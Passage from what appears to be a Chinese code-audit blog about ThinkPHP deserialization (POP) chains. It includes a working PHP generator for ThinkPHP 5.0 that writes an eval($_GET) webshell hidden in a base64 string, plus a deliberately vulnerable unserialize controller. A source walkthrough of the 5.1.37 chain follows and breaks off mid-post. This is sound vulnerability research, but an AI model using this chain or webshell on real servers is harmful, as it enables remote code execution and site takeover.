class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">    private $files = [];</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files = [new \think\model\Merge];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">namespace think\model;</span><br><span class="line">use think\Model;</span><br><span class="line"> </span><br><span class="line">class Merge extends Model</span><br><span class="line">&#123;</span><br><span class="line">    protected $append = [];</span><br><span class="line">    protected $error;</span><br><span class="line"> </span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;append = [</span><br><span class="line">            &#x27;bb&#x27; =&gt; &#x27;getError&#x27;</span><br><span class="line">        ];</span><br><span class="line">        $this-&gt;error = (new \think\model\relation\BelongsTo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think;</span><br><span class="line">class Model&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace think\model\relation;</span><br><span class="line">class BelongsTo</span><br><span class="line">&#123;</span><br><span class="line">    protected $query;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;query = (new \think\console\Output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">namespace think\console;</span><br><span class="line">class Output</span><br><span class="line">&#123;</span><br><span class="line">    protected $styles = [];</span><br><span class="line">    private $handle = null;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;styles = [&#x27;removeWhereField&#x27;];</span><br><span class="line">        $this-&gt;handle = (new \think\session\driver\Memcache);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">namespace think\session\driver;</span><br><span class="line">class Memcache</span><br><span class="line">&#123;</span><br><span class="line">    protected $handler = null;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;handler = (new \think\cache\driver\Memcached);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\cache\driver;</span><br><span class="line"></span><br><span class="line">class Memcached</span><br><span class="line">&#123;</span><br><span class="line">    protected $tag;</span><br><span class="line">    protected $options = [];</span><br><span class="line">    protected $handler = null;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;tag = true;</span><br><span class="line">        $this-&gt;options = [</span><br><span class="line">            &#x27;expire&#x27;   =&gt; 0,</span><br><span class="line">            &#x27;prefix&#x27;   =&gt; &#x27;PD9waHAKZXZhbCgkX0dFVFsnYSddKTsKPz4&#x27;,</span><br><span class="line">        ];</span><br><span class="line">        $this-&gt;handler = (new File);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class File</span><br><span class="line">&#123;</span><br><span class="line">    protected $tag;</span><br><span class="line">    protected $options = [];</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;tag = false;</span><br><span class="line">        $this-&gt;options = [</span><br><span class="line">            &#x27;expire&#x27;        =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;cache_subdir&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;prefix&#x27;        =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;data_compress&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">            &#x27;path&#x27;          =&gt; &#x27;php://filter/convert.base64-decode/resource=./&#x27;,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">echo base64_encode(serialize(new \think\process\pipes\Windows));</span><br></pre></td></tr></table></figure>
<p>然后在application的lndex.php文件中构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\index\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index()</span><br><span class="line">    &#123;</span><br><span class="line">        $a=$_GET[1];</span><br><span class="line">        unserialize(base64_decode($a));</span><br><span class="line">        return &#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; .think_default_text&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:)&lt;/h1&gt;&lt;p&gt; ThinkPHP V5&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;十年磨一剑 - 为API开发设计的高性能框架&lt;/span&gt;&lt;/p&gt;&lt;span style=&quot;font-size:22px;&quot;&gt;[ V5.0 版本由 &lt;a href=&quot;http://www.qiniu.com&quot; target=&quot;qiniu&quot;&gt;七牛云&lt;/a&gt; 独家赞助发布 ]&lt;/span&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=9347272&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;ad_bd568ce7058a1091&quot;&gt;&lt;/think&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后get提交base64加密的值，即可在本目录下生成文件</p>
<p>参考文章：[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozhiru/p/12452528.html]">https://www.cnblogs.com/xiaozhiru/p/12452528.html]</a><br>    [<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41891666/article/details/107503710]">https://blog.csdn.net/qq_41891666/article/details/107503710]</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-ThinkPHP5.1.37反序列化链" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2021/10/30/ThinkPHP5.1.37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/" class="article-date">
  	<time datetime="2021-10-29T16:00:00.000Z" itemprop="datePublished">2021-10-30</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/10/30/ThinkPHP5.1.37%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/">
        ThinkPHP5.1.37反序列化链
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="环境构造"><a href="#环境构造" class="headerlink" title="环境构造"></a>环境构造</h1><p>环境：php 7.0.12<br>下载包：[<a target="_blank" rel="noopener" href="https://github.com/top-think/framework/releases/tag/v5.1.37]">https://github.com/top-think/framework/releases/tag/v5.1.37]</a><br>              [<a target="_blank" rel="noopener" href="https://github.com/top-think/think/releases/tag/v5.1.37]">https://github.com/top-think/think/releases/tag/v5.1.37]</a></p>
<p>只要将framework改为thinkphp放进think-5.1.37里即可</p>
<h1 id="ThinkPHP5-1-37反序列化链"><a href="#ThinkPHP5-1-37反序列化链" class="headerlink" title="ThinkPHP5.1.37反序列化链"></a>ThinkPHP5.1.37反序列化链</h1><p>首先用全局变量搜索__destruct()，发现在think\process\pipes\Windows.php的__destruct()有可利用的地方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct()</span><br><span class="line">&#123;</span><br><span class="line">    $this-&gt;close();</span><br><span class="line">    $this-&gt;removeFiles();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们看向removeFiles()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">private function removeFiles()</span><br><span class="line">&#123;</span><br><span class="line">    foreach ($this-&gt;files as $filename) &#123;</span><br><span class="line">        if (file_exists($filename)) &#123;</span><br><span class="line">            @unlink($filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $this-&gt;files = [];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看见file_exists()，这个函数的参数必须是String的形式，所以我们可以利用这个特性来触发__toString()，我们通过全局搜索，对各文件的__toString()进行比对，我们可以使用think\Collection.php的__toString()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function __toString()</span><br><span class="line">&#123;</span><br><span class="line">    return $this-&gt;toJson();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后看向toJson()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function toJson($options = JSON_UNESCAPED_UNICODE)</span><br><span class="line">&#123;</span><br><span class="line">    return json_encode($this-&gt;toArray(), $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后再看向toArray()，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">public function toArray()</span><br><span class="line">&#123;</span><br><span class="line">    $item       = [];</span><br><span class="line">    $hasVisible = false;</span><br><span class="line"></span><br><span class="line">    foreach ($this-&gt;visible as $key =&gt; $val) &#123;</span><br><span class="line">        if (is_string($val)) &#123;</span><br><span class="line">            if (strpos($val, &#x27;.&#x27;)) &#123;</span><br><span class="line">                list($relation, $name)      = explode(&#x27;.&#x27;, $val);</span><br><span class="line">                $this-&gt;visible[$relation][] = $name;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;visible[$val] = true;</span><br><span class="line">                $hasVisible          = true;</span><br><span class="line">            &#125;</span><br><span class="line">            unset($this-&gt;visible[$key]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    foreach ($this-&gt;hidden as $key =&gt; $val) &#123;</span><br><span class="line">        if (is_string($val)) &#123;</span><br><span class="line">            if (strpos($val, &#x27;.&#x27;)) &#123;</span><br><span class="line">                list($relation, $name)     = explode(&#x27;.&#x27;, $val);</span><br><span class="line">                $this-&gt;hidden[$relation][] = $name;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $this-&gt;hidden[$val] = true;</span><br><span class="line">            &#125;</span><br><span class="line">            unset($this-&gt;hidden[$key]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 合并关联数据</span><br><span class="line">    $data = array_merge($this-&gt;data, $this-&gt;relation);</span><br><span class="line"></span><br><span class="line">    foreach ($data as $key =&gt; $val) &#123;</span><br><span class="line">        if ($val instanceof Model || $val instanceof ModelCollection) &#123;</span><br><span class="line">            // 关联模型对象</span><br><span class="line">            if (isset($this-&gt;visible[$key])) &#123;</span><br><span class="line">                $val-&gt;visible($this-&gt;visible[$key]);</span><br><span class="line">            &#125; elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) &#123;</span><br><span class="line">                $val-&gt;hidden($this-&gt;hidden[$key]);</span><br><span class="line">            &#125;</span><br><span class="line">            // 关联模型对象</span><br><span class="line">            if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) &#123;</span><br><span class="line">                $item[$key] = $val-&gt;toArray();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; elseif (isset($this-&gt;visible[$key])) &#123;</span><br><span class="line">            $item[$key] = $this-&gt;getAttr($key);</span><br><span class="line">        &#125; elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) &#123;</span><br><span class="line">            $item[$key] = $this-&gt;getAttr($key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 追加属性（必须定义获取器）</span><br><span class="line">    if (!empty($this-&gt;append)) &#123;</span><br><span class="line">        foreach ($this-&gt;append as $key =&gt; $name) &#123;</span><br><span class="line">            if (is_array($name)) &#123;</span><br><span class="line">                // 追加关联对象属性</span><br><span class="line">                $relation = $this-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line">                if (!$relation) &#123;</span><br><span class="line">                    $relation = $this-&gt;getAttr($key);</span><br><span class="line">                    $relation-&gt;visible($name);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                $item[$key] = $relation-&gt;append($name)-&gt;toArray();</span><br><span class="line">            &#125; elseif (strpos($name, &#x27;.&#x27;)) &#123;</span><br><span class="line">                list($key, $attr) = explode(&#x27;.&#x27;, $name);</span><br><span class="line">                // 追加关联对象属性</span><br><span class="line">                $relation = $this-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line">                if (!$relation) &#123;</span><br><span class="line">                    $relation = $this-&gt;getAttr($key);</span><br><span class="line">                    $relation-&gt;visible([$attr]);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                $item[$key] = $relation-&gt;append([$attr])-&gt;toArray();</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $item[$name] = $this-&gt;getAttr($name, $item);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return $item;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现toArray()函数中的这里是可利用点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if (!empty($this-&gt;append)) &#123;</span><br><span class="line">            foreach ($this-&gt;append as $key =&gt; $name) &#123;</span><br><span class="line">                if (is_array($name)) &#123;</span><br><span class="line">                    // 追加关联对象属性</span><br><span class="line">                    $relation = $this-&gt;getRelation($key);</span><br><span class="line"></span><br><span class="line">                    if (!$relation) &#123;</span><br><span class="line">                        $relation = $this-&gt;getAttr($key);</span><br><span class="line">                        $relation-&gt;visible($name);</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>
<p>我们可以利用$relation-&gt;visible($name);来触发__call()魔术方法，但是我们需要$this-&gt;append是可控点以及$relation是可控点，现在我们知道$this-&gt;append是可控的，但是$relation是否可控，我们需要看向getRelation()函数，所以根据全局搜索，我们可以看向think\model\concern\RelationShip.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function getRelation($name = null)</span><br><span class="line">&#123;</span><br><span class="line">    if (is_null($name)) &#123;</span><br><span class="line">        return $this-&gt;relation;</span><br><span class="line">    &#125; elseif (array_key_exists($name, $this-&gt;relation)) &#123;</span><br><span class="line">        return $this-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于输入的$key不在$this-&gt;relation中，所以返回空，因此可以通过if (!$relation)，但是我们需要$relation可控，所以我们要继续看向getAttr()函数，可以通过全局搜索，看向think\model\concern\Attribute.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">public function getAttr($name, &amp;$item = null)</span><br><span class="line">    &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            $notFound = false;</span><br><span class="line">            $value    = $this-&gt;getData($name);</span><br><span class="line">        &#125; catch (InvalidArgumentException $e) &#123;</span><br><span class="line">            $notFound = true;</span><br><span class="line">            $value    = null;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // 检测属性获取器</span><br><span class="line">        $fieldName = Loader::parseName($name);</span><br><span class="line">        $method    = &#x27;get&#x27; . Loader::parseName($name, 1) . &#x27;Attr&#x27;;</span><br><span class="line"></span><br><span class="line">        if (isset($this-&gt;withAttr[$fieldName])) &#123;</span><br><span class="line">            if ($notFound &amp;&amp; $relation = $this-&gt;isRelationAttr($name)) &#123;</span><br><span class="line">                $modelRelation = $this-&gt;$relation();</span><br><span class="line">                $value         = $this-&gt;getRelationData($modelRelation);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $closure = $this-&gt;withAttr[$fieldName];</span><br><span class="line">            $value   = $closure($value, $this-&gt;data);</span><br><span class="line">        &#125; elseif (method_exists($this, $method)) &#123;</span><br><span class="line">            if ($notFound &amp;&amp; $relation = $this-&gt;isRelationAttr($name)) &#123;</span><br><span class="line">                $modelRelation = $this-&gt;$relation();</span><br><span class="line">                $value         = $this-&gt;getRelationData($modelRelation);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $value = $this-&gt;$method($value, $this-&gt;data);</span><br><span class="line">        &#125; elseif (isset($this-&gt;type[$name])) &#123;</span><br><span class="line">            // 类型转换</span><br><span class="line">            $value = $this-&gt;readTransform($value, $this-&gt;type[$name]);</span><br><span class="line">        &#125; elseif ($this-&gt;autoWriteTimestamp &amp;&amp; in_array($name, [$this-&gt;createTime, $this-&gt;updateTime])) &#123;</span><br><span class="line">            if (is_string($this-&gt;autoWriteTimestamp) &amp;&amp; in_array(strtolower($this-&gt;autoWriteTimestamp), [</span><br><span class="line">                &#x27;datetime&#x27;,</span><br><span class="line">                &#x27;date&#x27;,</span><br><span class="line">                &#x27;timestamp&#x27;,</span><br><span class="line">            ])) &#123;</span><br><span class="line">                $value = $this-&gt;formatDateTime($this-&gt;dateFormat, $value);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $value = $this-&gt;formatDateTime($this-&gt;dateFormat, $value, true);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; elseif ($notFound) &#123;</span><br><span class="line">            $value = $this-&gt;getRelationAttribute($name, $item);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>看它的return $value，我们可以看一下$value是怎么来的，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value    = $this-&gt;getData($name);</span><br></pre></td></tr></table></figure>
<p>因此，我们需要看向getData()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public function getData($name = null)</span><br><span class="line">&#123;</span><br><span class="line">    if (is_null($name)) &#123;</span><br><span class="line">        return $this-&gt;data;</span><br><span class="line">    &#125; elseif (array_key_exists($name, $this-&gt;data)) &#123;</span><br><span class="line">        return $this-&gt;data[$name];</span><br><span class="line">    &#125; elseif (array_key_exists($name, $this-&gt;relation)) &#123;</span><br><span class="line">        return $this-&gt;relation[$name];</span><br><span class="line">    &#125;</span><br><span class="line">    throw new InvalidArgumentException(&#x27;property not exists:&#x27; . static::class . &#x27;-&gt;&#x27; . $name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看见当传入的$key是data这个可控点的键值的时候，会返回return $this-&gt;data[$name]，从而让$relation成为可控点，此时，我们需要找一个__call()，里面会有一些危险函数可以利用，通过全局搜索，发现think\Request.php里的__call()可以利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public function __call($method, $args)</span><br><span class="line">&#123;</span><br><span class="line">    if (array_key_exists($method, $this-&gt;hook)) &#123;</span><br><span class="line">        array_unshift($args, $this);</span><br><span class="line">        return call_user_func_array($this-&gt;hook[$method], $args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    throw new Exception(&#x27;method not exists:&#x27; . static::class . &#x27;-&gt;&#x27; . $method);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是看到$this-&gt;hook是控制了必须在这个类中，一般think\Request.php里的input()方法是相当于call_user_func()，所以我们可以先找到这个类中的input()方法的使用函数，看哪个函数可以使用，最后发现param()函数可以使用，然后再看哪个函数使用了param()函数且只有一个参数的，发现isAjax()函数调用了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public function isAjax($ajax = false)</span><br><span class="line">&#123;</span><br><span class="line">    $value  = $this-&gt;server(&#x27;HTTP_X_REQUESTED_WITH&#x27;);</span><br><span class="line">    $result = &#x27;xmlhttprequest&#x27; == strtolower($value) ? true : false;</span><br><span class="line"></span><br><span class="line">    if (true === $ajax) &#123;</span><br><span class="line">        return $result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $result           = $this-&gt;param($this-&gt;config[&#x27;var_ajax&#x27;]) ? true : $result;</span><br><span class="line">    $this-&gt;mergeParam = false;</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>param()函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public function param($name = &#x27;&#x27;, $default = null, $filter = &#x27;&#x27;)</span><br><span class="line">&#123;</span><br><span class="line">    if (!$this-&gt;mergeParam) &#123;</span><br><span class="line">        $method = $this-&gt;method(true);</span><br><span class="line"></span><br><span class="line">        // 自动获取请求变量</span><br><span class="line">        switch ($method) &#123;</span><br><span class="line">            case &#x27;POST&#x27;:</span><br><span class="line">                $vars = $this-&gt;post(false);</span><br><span class="line">                break;</span><br><span class="line">            case &#x27;PUT&#x27;:</span><br><span class="line">            case &#x27;DELETE&#x27;:</span><br><span class="line">            case &#x27;PATCH&#x27;:</span><br><span class="line">                $vars = $this-&gt;put(false);</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                $vars = [];</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>input函数</p>
